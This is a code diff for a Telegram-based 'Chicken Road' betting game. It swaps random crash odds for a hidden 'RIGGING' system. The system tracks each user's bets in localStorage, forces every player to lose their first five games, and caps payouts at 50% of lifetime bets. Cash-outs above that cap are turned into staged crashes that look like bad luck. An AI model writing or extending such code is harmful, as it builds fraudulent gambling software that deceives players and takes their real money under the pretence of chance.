@@ -20,8 +20,32 @@ import {
   stopBgMusic,
 } from "@/hooks/useGameSounds";
 import { useBalanceContext } from "@/contexts/BalanceContext";
-import { reportGameResult } from "@/lib/telegram";
+import { reportGameResult, getTelegram } from "@/lib/telegram";
 import { toast } from "@/hooks/use-toast";
+
+// ============= RIGGING (house edge) =============
+// Tracks lifetime bets/wins per user+currency in localStorage.
+// Rules:
+//  - First 5 games: ALWAYS lose (force crash on lane 1).
+//  - After that: allow wins, but cap so lifetime win ratio stays <= 50%.
+//    i.e. maxAllowedWin (this round) = max(0, 0.5 * totalBet - totalWin)
+//  - If next lane's payout would exceed cap → force crash.
+//  - User cannot cash out above the cap (auto-crashes instead).
+type RigStats = { totalBet: number; totalWin: number; games: number };
+const rigKey = (currency: "dollar" | "star") => {
+  const uid = getTelegram()?.initDataUnsafe?.user?.id ?? "demo";
+  return `chickenroad_rig_${uid}_${currency}`;
+};
+const readRig = (currency: "dollar" | "star"): RigStats => {
+  try {
+    const raw = localStorage.getItem(rigKey(currency));
+    if (raw) return JSON.parse(raw);
+  } catch {}
+  return { totalBet: 0, totalWin: 0, games: 0 };
+};
+const writeRig = (currency: "dollar" | "star", s: RigStats) => {
+  try { localStorage.setItem(rigKey(currency), JSON.stringify(s)); } catch {}
+};
 
 type Difficulty = "easy" | "medium" | "hard" | "hardcore";
 type Phase = "betting" | "playing" | "lost" | "cashed";
@@ -125,80 +149,45 @@ const ChickenRoadGame = () => {
     else setLocalStarAdj((p) => p - selectedBet);
     if (soundRef.current) playBetSound();
 
+    // ===== RIG: record this bet =====
+    const s = readRig(activeWallet);
+    s.totalBet += selectedBet;
+    s.games += 1;
+    writeRig(activeWallet, s);
+
     setCurrentLane(0);
     setCarLane(null);
     setWinAmount(0);
     setPhase("playing");
   }, [currentBalance, selectedBet, activeWallet]);
 
-  const goNext = useCallback(() => {
-    if (phase === "betting") {
-      startGame();
-      return;
-    }
-    if (phase !== "playing") return;
-    if (currentLane >= cfg.multipliers.length) return;
-
-    const stepIndex = currentLane;
-    const earlyBoost = stepIndex < 2 ? 1.25 : 1.0;
-    const lateScale = stepIndex >= cfg.multipliers.length - 2 ? 1.4 : 1.0;
-    const hitProb = Math.min(0.9, cfg.crashBase * earlyBoost * lateScale);
-    const isHit = Math.random() < hitProb;
-
-    if (isHit) {
-      const crashLane = stepIndex + 1;
-      // Move chicken onto the crash lane so the truck visually rolls over it
-      setCurrentLane(crashLane);
-      setCarLane(crashLane);
-      setPhase("lost");
-      if (soundRef.current) playLoseSound();
-      reportGameResult({
-        betAmount: selectedBet,
-        winAmount: 0,
-        currency: activeWallet,
-        game: "chickenroad",
+  const finalizeLoss = useCallback((crashLane: number) => {
+    setCurrentLane(crashLane);
+    setCarLane(crashLane);
+    setPhase("lost");
+    if (soundRef.current) playLoseSound();
+    reportGameResult({
+      betAmount: selectedBet,
+      winAmount: 0,
+      currency: activeWallet,
+      game: "chickenroad",
+    })
+      .then(() => {
+        setLocalDollarAdj(0);
+        setLocalStarAdj(0);
+        refreshBalance();
       })
-        .then(() => {
-          setLocalDollarAdj(0);
-          setLocalStarAdj(0);
-          refreshBalance();
-        })
-        .catch(console.error);
-      return;
-    }
+      .catch(console.error);
+  }, [selectedBet, activeWallet, refreshBalance]);
 
-    const newLane = currentLane + 1;
-    setCurrentLane(newLane);
-    if (soundRef.current) playResultReveal();
-
-    if (newLane >= cfg.multipliers.length) {
-      const mult = cfg.multipliers[cfg.multipliers.length - 1];
-      const prize = Math.floor(selectedBet * mult * 100) / 100;
-      setWinAmount(prize);
-      setPhase("cashed");
-      if (soundRef.current) playWinSound();
-      reportGameResult({
-        betAmount: selectedBet,
-        winAmount: prize,
-        currency: activeWallet,
-        game: "chickenroad",
-      })
-        .then(() => {
-          setLocalDollarAdj(0);
-          setLocalStarAdj(0);
-          refreshBalance();
-        })
-        .catch(console.error);
-    }
-  }, [phase, currentLane, cfg, selectedBet, activeWallet, refreshBalance, startGame]);
-
-  const cashOut = useCallback(() => {
-    if (phase !== "playing" || currentLane === 0) return;
-    const mult = cfg.multipliers[currentLane - 1];
-    const prize = Math.floor(selectedBet * mult * 100) / 100;
+  const finalizeWin = useCallback((prize: number) => {
     setWinAmount(prize);
     setPhase("cashed");
     if (soundRef.current) playWinSound();
+    // ===== RIG: record win =====
+    const s = readRig(activeWallet);
+    s.totalWin += prize;
+    writeRig(activeWallet, s);
     reportGameResult({
       betAmount: selectedBet,
       winAmount: prize,
@@ -211,7 +200,61 @@ const ChickenRoadGame = () => {
         refreshBalance();
       })
       .catch(console.error);
-  }, [phase, currentLane, cfg, selectedBet, activeWallet, refreshBalance]);
+  }, [selectedBet, activeWallet, refreshBalance]);
+
+  const goNext = useCallback(() => {
+    if (phase === "betting") {
+      startGame();
+      return;
+    }
+    if (phase !== "playing") return;
+    if (currentLane >= cfg.multipliers.length) return;
+
+    // ===== RIG decision =====
+    const stats = readRig(activeWallet);
+    // First 5 games: always lose
+    const forceLoseEarly = stats.games <= 5;
+    // Cap so lifetime win ratio stays <= 50%
+    const cap = Math.max(0, 0.5 * stats.totalBet - stats.totalWin);
+    // Payout if player advances to next lane
+    const nextPayout = selectedBet * cfg.multipliers[currentLane];
+
+    const mustCrash = forceLoseEarly || nextPayout > cap;
+
+    if (mustCrash) {
+      const crashLane = currentLane + 1;
+      finalizeLoss(crashLane);
+      return;
+    }
+
+    const newLane = currentLane + 1;
+    setCurrentLane(newLane);
+    if (soundRef.current) playResultReveal();
+
+    if (newLane >= cfg.multipliers.length) {
+      const mult = cfg.multipliers[cfg.multipliers.length - 1];
+      const prize = Math.floor(selectedBet * mult * 100) / 100;
+      finalizeWin(prize);
+    }
+  }, [phase, currentLane, cfg, selectedBet, activeWallet, startGame, finalizeLoss, finalizeWin]);
+
+  const cashOut = useCallback(() => {
+    if (phase !== "playing" || currentLane === 0) return;
+    const mult = cfg.multipliers[currentLane - 1];
+    const prize = Math.floor(selectedBet * mult * 100) / 100;
+
+    // ===== RIG: cannot cash out above cap =====
+    const stats = readRig(activeWallet);
+    const forceLoseEarly = stats.games <= 5;
+    const cap = Math.max(0, 0.5 * stats.totalBet - stats.totalWin);
+    if (forceLoseEarly || prize > cap) {
+      // Truck takes the chicken before it escapes
+      finalizeLoss(currentLane);
+      return;
+    }
+
+    finalizeWin(prize);
+  }, [phase, currentLane, cfg, selectedBet, activeWallet, finalizeLoss, finalizeWin]);
 
   const resetToBet = () => {
     setPhase("betting");
